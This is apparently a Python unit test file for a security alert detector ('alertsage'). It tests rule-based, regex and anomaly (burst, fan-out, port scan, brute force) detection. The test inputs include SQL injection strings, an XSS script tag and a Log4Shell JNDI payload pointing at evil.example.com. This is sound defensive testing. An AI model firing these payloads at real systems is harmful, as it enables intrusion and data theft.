"""检测器测试：规则命中、正则兜底、行为异常。"""

from __future__ import annotations

import unittest
from datetime import timedelta

from alertsage.detectors import AnomalyDetector, DetectorContext, RegexDetector, RuleDetector
from alertsage.rules import load_rules
from tests.helpers import BASE_TIME, make_alert, make_settings


def ctx() -> DetectorContext:
    return DetectorContext(settings=make_settings())


class RuleDetectorTest(unittest.TestCase):
    def setUp(self) -> None:
        self.detector = RuleDetector(load_rules())

    def test_sqli_hit(self) -> None:
        hits = self.detector.detect(
            make_alert(payload="1 union select username,password from users--"), ctx()
        )
        self.assertIn("WEB-SQLI-001", [d.rule_id for d in hits])

    def test_xss_hit(self) -> None:
        hits = self.detector.detect(make_alert(payload="<script>alert(1)</script>"), ctx())
        self.assertIn("WEB-XSS-001", [d.rule_id for d in hits])

    def test_log4j_hit_on_user_agent(self) -> None:
        hits = self.detector.detect(
            make_alert(user_agent="${jndi:ldap://evil.example.com/a}"), ctx()
        )
        self.assertIn("WEB-LOG4J-001", [d.rule_id for d in hits])

    def test_ssh_brute_hit(self) -> None:
        hits = self.detector.detect(
            make_alert(
                dst_port=22,
                alert_type="SSH Brute Force",
                raw_log="Failed password for root",
            ),
            ctx(),
        )
        self.assertIn("NET-SSH-BRUTE-001", [d.rule_id for d in hits])

    def test_benign_no_hit(self) -> None:
        hits = self.detector.detect(
            make_alert(target_url="/health", payload=None, raw_log=None, user_agent="Uptime-Kuma/1.23"),
            ctx(),
        )
        self.assertEqual(hits, [])

    def test_multiple_hits_kept(self) -> None:
        hits = self.detector.detect(
            make_alert(
                payload="1 union select 1 and sleep(5)",
                target_url="/admin.php",
                status_code=404,
            ),
            ctx(),
        )
        self.assertGreaterEqual(len(hits), 2)


class RegexDetectorTest(unittest.TestCase):
    def test_legacy_pattern_hit(self) -> None:
        detector = RegexDetector()
        hits = detector.detect(make_alert(payload="1' OR 1=1--"), ctx())
        self.assertIn("REGEX-SQLI", [d.rule_id for d in hits])

    def test_low_confidence(self) -> None:
        detector = RegexDetector()
        hits = detector.detect(make_alert(user_agent="sqlmap/1.7"), ctx())
        self.assertTrue(hits)
        self.assertLess(hits[0].confidence, 0.7)

    def test_empty_text_no_crash(self) -> None:
        detector = RegexDetector()
        self.assertEqual(detector.detect(make_alert(payload=None, raw_log=None, target_url=None), ctx()), [])

    def test_custom_patterns(self) -> None:
        import re

        detector = RegexDetector(
            [{"id": "X-1", "title": "t", "pattern": re.compile("evil"), "severity": "low"}]
        )
        self.assertEqual(len(detector.detect(make_alert(payload="evil"), ctx())), 1)


class AnomalyDetectorTest(unittest.TestCase):
    def setUp(self) -> None:
        self.detector = AnomalyDetector()
        self.settings = make_settings(burst_threshold=5, rate_distinct_targets=6, rate_window_seconds=300)

    def _ctx(self) -> DetectorContext:
        return DetectorContext(settings=self.settings)

    def test_burst(self) -> None:
        hits = []
        for index in range(5):
            alert = make_alert(
                alert_id=f"a{index}",
                timestamp=BASE_TIME + timedelta(seconds=index * 10),
            )
            hits.extend(self.detector.detect(alert, self._ctx()))
        self.assertIn("ANOM-BURST", [h.rule_id for h in hits])

    def test_fanout(self) -> None:
        hits = []
        for index in range(6):
            alert = make_alert(
                alert_id=f"f{index}",
                timestamp=BASE_TIME + timedelta(seconds=index * 5),
                target_url=f"/api/item/{index}",
            )
            hits.extend(self.detector.detect(alert, self._ctx()))
        self.assertIn("ANOM-FANOUT", [h.rule_id for h in hits])

    def test_port_scan(self) -> None:
        hits = []
        for index in range(16):
            alert = make_alert(
                alert_id=f"p{index}",
                timestamp=BASE_TIME + timedelta(seconds=index),
                dst_port=1000 + index,
                target_url=None,
            )
            hits.extend(self.detector.detect(alert, self._ctx()))
        self.assertIn("ANOM-PORTSCAN", [h.rule_id for h in hits])

    def test_auth_failures(self) -> None:
        hits = []
        for index in range(6):
            alert = make_alert(
                alert_id=f"b{index}",
                timestamp=BASE_TIME + timedelta(seconds=index),
                status_code=401,
                alert_type="login failed",
            )
            hits.extend(self.detector.detect(alert, self._ctx()))
        self.assertIn("ANOM-AUTH-BRUTE", [h.rule_id for h in hits])

    def test_isolated_events_no_anomaly(self) -> None:
        hits = []
        for index in range(3):
            alert = make_alert(
                alert_id=f"i{index}",
                timestamp=BASE_TIME + timedelta(minutes=index * 10),
            )
            hits.extend(self.detector.detect(alert, self._ctx()))
        self.assertEqual(hits, [])

    def test_no_src_ip_returns_empty(self) -> None:
        self.assertEqual(self.detector.detect(make_alert(src_ip=None), self._ctx()), [])

    def test_reset_clears_state(self) -> None:
        for index in range(5):
            self.detector.detect(
                make_alert(alert_id=f"r{index}", timestamp=BASE_TIME + timedelta(seconds=index)),
                self._ctx(),
            )
        self.detector.reset()
        self.assertEqual(self.detector.detect(make_alert(alert_id="after-reset"), self._ctx()), [])

    def test_window_expiry(self) -> None:
        for index in range(4):
            self.detector.detect(
                make_alert(alert_id=f"w{index}", timestamp=BASE_TIME + timedelta(seconds=index)),
                self._ctx(),
            )
        hits = self.detector.detect(
            make_alert(alert_id="late", timestamp=BASE_TIME + timedelta(hours=2)), self._ctx()
        )
        self.assertEqual(hits, [])


if __name__ == "__main__":
    unittest.main()
